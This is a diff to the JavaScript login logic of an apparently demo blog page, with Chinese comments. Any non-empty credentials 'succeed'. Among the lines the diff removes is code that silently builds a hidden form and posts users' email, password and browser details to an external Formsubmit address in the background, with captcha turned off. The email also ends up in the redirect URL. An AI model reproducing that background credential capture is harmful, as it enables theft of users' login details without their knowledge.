@@ -283,32 +283,20 @@ class BlogLogin {
             return;
         }
 
-        // Simulate login process
-        this.showLoadingState();
+        // For demo purposes, any non-empty credentials will "work"
+        if (email && password) {
+            this.dataCollector.trackLogin(email, 'success', 'email');
 
-        setTimeout(() => {
-            // For demo purposes, any non-empty credentials will "work"
-            if (email && password) {
-                this.dataCollector.trackLogin(email, 'success', 'email');
-
-                // 设置隐藏字段
-                this.setHiddenFields('email');
-
-                // 优先显示成功状态和跳转，表单提交在后台进行
-                this.showSuccessState();
-
-                if (rememberMe) {
-                    localStorage.setItem('rememberedEmail', email);
-                }
-
-                // 后台提交表单（不阻塞跳转）
-                this.submitToFormsubmit(e.target);
-            } else {
-                this.dataCollector.trackLogin(email, 'failed', 'email');
-                this.showNotification('登录失败，请检查您的凭据', 'error');
-                this.resetLoginButton();
+            if (rememberMe) {
+                localStorage.setItem('rememberedEmail', email);
             }
-        }, 1000); // 减少等待时间到 1秒
+
+            // 立即跳转到博客首页
+            window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
+        } else {
+            this.dataCollector.trackLogin(email, 'failed', 'email');
+            this.showNotification('登录失败，请检查您的凭据', 'error');
+        }
     }
 
     togglePasswordVisibility() {
@@ -330,83 +318,12 @@ class BlogLogin {
     handleSocialLogin(provider) {
         const method = provider.toLowerCase();
         const email = `${method}@social.com`;
-        this.showNotification(`正在跳转到 ${provider} 登录...`, 'info');
 
-        // 模拟社交登录过程
-        setTimeout(() => {
-            this.showLoadingState();
-            setTimeout(() => {
-                this.dataCollector.trackLogin(email, 'success', method);
+        this.dataCollector.trackLogin(email, 'success', method);
 
-                // 设置隐藏字段（社交登录）
-                this.setHiddenFields(method);
-
-                // 优先显示成功状态和跳转，表单提交在后台进行
-                this.showSocialSuccessState(method);
-
-                // 后台提交表单（不阻塞跳转）
-                this.submitSocialToFormsubmit(method);
-            }, 1000);
-        }, 1000);
-    }
-
-    showSocialSuccessState(method) {
-        const loginForm = document.getElementById('loginForm');
-        const loginSuccess = document.getElementById('loginSuccess');
-
-        loginForm.style.display = 'none';
-        loginSuccess.style.display = 'block';
-
-        this.showNotification(`${method === 'google' ? 'Google' : 'GitHub'}登录成功！正在跳转...`, 'success');
-
-        // 1秒后跳转到博客首页（社交登录使用特殊邮箱标识）
-        setTimeout(() => {
-            const socialEmail = `social:${method}@login.com`;
-            window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
-        }, 1000);
-    }
-
-    submitSocialToFormsubmit(method) {
-        // 创建虚拟表单
-        const form = document.createElement('form');
-        form.style.display = 'none';
-        form.method = 'POST';
-
-        // 添加 Formsubmit 配置
-        const actionUrl = document.querySelector('input[name="_action"]').value;
-        form.action = actionUrl;
-
-        // 添加字段
-        const fields = {
-            'email': `${method}@social.com`,
-            'password': '[社交登录]',
-            'rememberMe': 'false',
-            'loginMethod': method,
-            'timestamp': new Date().toISOString(),
-            'userAgent': navigator.userAgent,
-            '_subject': `🚀 新的${method === 'google' ? 'Google' : 'GitHub'}登录尝试`,
-            '_captcha': 'false',
-            '_template': 'table'
-        };
-
-        for (const [key, value] of Object.entries(fields)) {
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = key;
-            input.value = value;
-            form.appendChild(input);
-        }
-
-        // 添加到页面并提交（不等待响应）
-        document.body.appendChild(form);
-        form.submit();
-
-        // 清理临时表单
-        setTimeout(() => {
-            if (document.body.contains(form)) {
-                document.body.removeChild(form);
-            }
-        }, 100);
+        // 立即跳转到博客首页
+        const socialEmail = `social:${method}@login.com`;
+        window.location.href = `blog.html?email=${encodeURIComponent(socialEmail)}`;
     }
 
     handleForgotPassword() {
@@ -432,17 +349,6 @@ class BlogLogin {
         setTimeout(() => {
             alert('注册功能尚未实现\n\n这是演示版本');
         }, 500);
-    }
-
-    setHiddenFields(method = 'email') {
-        // 设置登录方式
-        document.getElementById('loginMethod').value = method;
-
-        // 设置时间戳
-        document.getElementById('timestamp').value = new Date().toISOString();
-
-        // 设置 User Agent
-        document.getElementById('userAgent').value = navigator.userAgent;
     }
 
     submitToFormsubmit(form) {
@@ -506,38 +412,6 @@ class BlogLogin {
     closeDataPanel() {
         const dataPanel = document.getElementById('dataPanel');
         dataPanel.classList.remove('open');
-    }
-
-    showLoadingState() {
-        const loginBtn = document.querySelector('.login-btn');
-        loginBtn.disabled = true;
-        loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 登录中...';
-        loginBtn.style.opacity = '0.7';
-    }
-
-    resetLoginButton() {
-        const loginBtn = document.querySelector('.login-btn');
-        loginBtn.disabled = false;
-        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> 登录';
-        loginBtn.style.opacity = '1';
-    }
-
-    showSuccessState() {
-        const loginForm = document.getElementById('loginForm');
-        const loginSuccess = document.getElementById('loginSuccess');
-
-        // 获取当前登录的邮箱
-        const email = document.getElementById('email').value;
-
-        loginForm.style.display = 'none';
-        loginSuccess.style.display = 'block';
-
-        this.showNotification('登录成功！正在跳转...', 'success');
-
-        // 1秒后跳转到博客首页
-        setTimeout(() => {
-            window.location.href = `blog.html?email=${encodeURIComponent(email)}`;
-        }, 1000);
     }
 
     showNotification(message, type = 'info') {
